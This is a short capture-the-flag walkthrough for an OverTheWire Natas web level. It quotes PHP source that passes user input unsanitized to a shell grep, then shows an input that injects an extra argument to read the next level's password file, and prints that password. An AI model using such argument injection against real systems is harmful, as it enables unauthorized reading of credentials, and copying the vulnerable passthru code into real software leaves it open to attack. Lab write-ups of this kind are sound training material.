# Level 10

Leviathan OverTheWire Level 10: [level 10](https://overthewire.org/wargames/natas/)

## Level 10 info
Find words containing: 


## Answer
We first look at the sourcecode to understand how this programs finds words
[here](http://natas9.natas.labs.overthewire.org/index-source.html)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

It seems like whatever we put in the input seems to be grepping. What if we give it an empty string and then search through a different file maybe /etc/natas_webpass/natas10

If we input:
```html
'' /etc/natas_webpass/natas10 #
```

We add the pound to ingore the dictionary.txt file 

Our Output is then this: 
```html
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
natas 10 password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

## Level 10 Website
[natas10](http://natas10.natas.labs.overthewire.org)